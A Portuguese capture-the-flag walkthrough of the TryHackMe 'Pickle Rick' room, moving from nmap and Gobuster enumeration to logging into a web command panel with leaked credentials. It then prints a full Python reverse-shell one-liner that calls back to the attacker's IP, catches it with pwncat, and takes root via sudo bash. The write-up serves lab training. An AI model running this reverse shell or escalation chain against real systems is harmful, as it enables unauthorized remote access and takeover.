Para começarmos, iremos nos conectar ao servidor VPN do TryHackMe usando o seguinte comando: sudo openvpn (diretório do arquivo). Caso esteja usando uma máquina virtual, pode pular este passo.

[images/image1]

Primeiramente, iremos fazer um scan nas portas abertas do host alvo, ou seja, o IP que o TryHackMe nos proporciona.

Utilizando o nmap, nós iremos fazer uma varredura nas portas até um determinado número que irei definir como 10000.

![images/image2]

Agora, irei explicar para que os comandos servem:

O -p serve para você selecionar uma quantidade de portas, podendo ser default ou um número específico colocado logo após, como no caso -p -10000. O - antes do 10000 é uma abreviação para definir que é de 0 até 10000.

O -sV serve para determinar a versão dos serviços que estão abertos nas portas.

O -sC serve para executar um script automático do nmap para dar detalhes sobre os serviços e detectar possíveis vulnerabilidades.

Após o nmap escanear as portas abertas, podemos perceber que temos 2 portas abertas: a porta 22/tcp com o serviço SSH e a porta 80/tcp com o serviço HTTP.

![images/image3]

Primeiro, irei explicar o que é uma porta aberta. Uma porta aberta significa que a porta está aceitando conexões de entrada, ou seja, tem algum aplicativo lá que está pronto ou está recebendo dados de entrada.

Agora, vamos ver o que é TCP. O TCP, ou Transmission Control Protocol, é um protocolo de rede que os computadores usam para enviar ou receber informações, garantindo a entrega confiável das informações. E o protocolo UDP, ou User Datagram Protocol, tem a mesma função de transmitir informações entre computadores, porém, enquanto o Protocolo TCP é mais confiável e seguro ao transmitir informações, ele acaba sendo mais lento. Então, para aplicativos que exigem uma eficiência maior e com menos preocupação na entrega das informações, utiliza-se o UDP.

Agora que sabemos sobre as portas e como são transmitidas as informações, vamos ver os serviços.

O SSH, ou Secure Shell, é um protocolo de comunicação entre dois dispositivos dentro da rede, geralmente o cliente (sua máquina) e o servidor (onde está hospedado o serviço). Ele é normalmente usado para acessar e controlar remotamente dispositivos, principalmente servidores, de forma segura e com uma conexão criptografada.

O HTTP, ou Hypertext Transfer Protocol, é um protocolo de comunicação utilizado para transferir dados pela World Wide Web. Ele é o principal protocolo utilizado para acessar e enviar informações em páginas da web.

Sabendo disso, nós conseguimos ver que temos uma página web aberta naquele IP, então colocamos ele na barra de pesquisa e então... KATCHAU!, temos um site.

![images/image4]

Quase me esqueci, o motivo de eu ter escolhido primeiro ir atrás do site é porque, para acessar o servidor utilizando o SSH, é necessário ter um usuário e uma senha, que inicialmente não temos.

Agora, nós iremos ver se o site tem algum diretório ou caminho escondido utilizando o Gobuster.

![images/image5]

O Gobuster serve para fazer um ataque de força bruta e de enumeração em servidores web, ou seja, ele vai atrás de diretórios ou caminhos ocultos em um servidor web, tentando acessar várias URLs dentro daquele servidor. Exemplo: http://localhost/ - essa seria a URL padrão, o Gobuster tentaria acessá-la várias vezes colocando mais finais, como http://localhost/login, http://localhost/password, http://localhost/index, até conseguir encontrar algo ou então até terminar a wordlist (lista de palavras) que você colocou.

Agora, vamos ver para que serve os comandos utilizados:

O -u serve para você colocar qual a URL do servidor web.

O -w é para colocar o caminho para a wordlist (lista de palavras) que você estará usando. No meu caso, estou usando a directory-list-2.3-medium (só jogar no Google e colocar "github" no final que você acha).

O -x é para extensão do arquivo, ou seja, a terminação como, por exemplo, index.html ou então login.php.

![images/image6]

Como podemos ver, após aguardar alguns minutos, ele achou alguns caminhos ocultos que usaremos depois do "/". Exemplo: http://localhost/robots.txt, http://localhost/index.html, http://localhost/login.php.

Agora, iremos verificar cada um para ver se encontramos algo.

![images/image7]

No index.html é a página inicial.

![images/image8]

Nessa URL, conseguimos algo, provavelmente o painel do servidor web, mas precisamos de um usuário e uma senha.

![images/image9]

Volta para a mesma página do login.php.

![images/image10]

Opa, achamos algo, mas não sabemos se iremos utilizar, mas sempre é bom guardar. - Wubbalubbadubdub

Olhamos tudo e percebemos que precisamos de um login e uma senha, pode ser que a palavra achada no robots.txt seja ou o login ou a senha. Como não encontramos mais nada na parte visual, iremos dar uma inspecionada no código por trás das páginas.

Voltando ao index.html, não conseguimos muitas informações na parte visual, então vamos dar uma inspecionada nele usando o F12 no Chrome e então, BINGO! Temos um login. - R1ckRul3s

![images/image11]

Após olharmos as outras, não encontramos nada.... mas peraí, nós temos aquela palavra esquisita colocada no robots.txt, então entramos no /login.php e colocamos o login: R1ckRul3s e a senha: Wubbalubbadubdub e então KATCHAU!! Conseguimos entrar.

![images/image12]

Após entrarmos, podemos ver que temos um tal de Command Panel, poderia ser que fosse algum painel de administrador para executar comandos, então vamos tentar executar algo nele. Usei um comando básico do Linux, o ls, que serve para listar os arquivos existentes no diretório atual e então.... BINGO! Conseguimos mais URLs.

![images/image13]

Vamos dar uma checada em cada um... no primeiro, conseguimos algo. Temos que o super ingrediente secreto é o mr. meeseek hair, vamos guardar essa informação.

![images/image14]

Nos assets, vemos algumas configurações do sistema, porém nada de útil.

![images/image15]

Na clue, recebemos uma dica: "olhe ao redor dos arquivos do sistema para encontrar o outro ingrediente", então nós temos que entrar no sistema.

![images/image16]

No denied, não tinha nada demais, não vou colocar o print pois não havia nada.

Agora, iremos voltar para a página de comandos, ele está rodando Linux, ou seja, ele pode executar comandos e abrir portas, ou seja, nós podemos fazer um reverse secure shell. Vamos utilizar esse terminal para abrir o caminho para dentro do sistema, mas primeiro vamos testar para ver se ele nos dá permissão para fazer isso.

Após alguns testes, vemos que podemos usar o Python3 no terminal.

![images/image18]

Então, vamos fazer um reverse secure shell, procurando um pouco, nós achamos o Python reverse shell no Pentestmonkey. - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU IP", PORTA PARA SE ABRIR));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![images/image19]

Mas nós precisamos dar uma editada, pois o IP ali não é o nosso.

![images/image20]

Para pegarmos o nosso IP, nós utilizaremos o seguinte comando: ip a s tun0. Por que utilizar assim é uma abreviação de ip addr show tun0. Tá, mas para que o tun0? É para pegarmos o IP associado à VPN.

![images/image21]

Agora, iremos colocar o nosso IP, ou seja, tudo antes do /. No meu caso, 10.2.118.150, e a porta que iremos abrir vai ser 9999, por motivo pessoal você pode escolher qualquer outra.

![images/image22]

Certo, agora que temos a abertura do servidor preparada, vamos nos preparar para receber a conexão usando o pwncat.

Em resumo, o pwncat é uma ferramenta para interagir com serviços remotos e executar comandos de forma flexível, usando o pwncat-cs para fazer a conexão e o -p para selecionar a porta, ou seja, a mesma que colocamos acima, 9999.

![images/image23]

Agora, iremos executar o comando para o nós estarmos prontos para receber as portas.

![images/image24]

Agora, com tudo pronto, iremos colocar o comando do reverse shell no painel de comando.

![images/image25]

Após clicarmos em "Execute", BINGO!! Estamos dentro.

![images/image26]

Agora, nós iremos sair do pwncat e ir para o sistema mesmo utilizando o comando back.

![images/image27]

Estamos conectados com o servidor. Agora, nós temos que procurar pelos nossos objetivos nessa CTF, que são encontrar os ingredientes para fazer a poção para o Rick. Já encontramos um, falta mais 2. Vamos navegar pelo sistema usando o ls e o cd, sendo o ls para ver os arquivos e o cd para entrar ou sair dos diretórios.

![images/image28]

Após olharmos, podemos ver que não tem nenhuma informação que não já não tenhamos visto previamente.

![images/image29]

Voltamos alguns diretórios utilizando o cd .. e encontramos o home. Após acessarmos, achamos o second ingredient, ou seja, o segundo ingrediente que precisamos. Abrimos ele usando o comando cat e KATCHAU!! O segundo ingrediente é 1 jerry tear. Vamos salvar a informação - 1 jerry tear.

![images/image30]

No home, nós também encontramos outro diretório chamado "ubuntu". Vamos acessá-lo para ver o que tem nele.

![images/image31]

Após olharmos, não tem nada, acho que nós teremos que olhar na parte do "/root" para ver se ele salvou alguma informação lá, mas primeiro precisamos conseguir acesso de root. Vamos utilizar o comando sudo -l para vermos o que podemos executar sem comando de root.

![images/image32]

Opa, CHECK-MATE! Podemos executar qualquer arquivo sem utilizar senha, ou seja, só precisamos conseguir o acesso de root usando sudo bash.

![images/image33]

TOMA GAP! Conseguimos acesso de root, agora tudo que precisamos fazer é entrar dentro do diretório do root e procurarmos usando o ls. E então EUREKA! Conseguimos achar o 3º ingrediente. Usando o cat, nós vemos o conteúdo dele, e então com isso conseguimos acabar esse desafio. O 3º ingrediente é fleeb juice. Vamos guardar e colocar as respostas no TryHackMe e então finalmente iremos acabar esse desafio.

![images/image34]

![images/image35]

Agora, nós iremos no site e colocar as informações e então TOMA GAP! Conseguimos acabar o Desafio. Obrigado por verem até o final e espero que tenham absorvido alguma coisa e mais do que tudo se divertido.

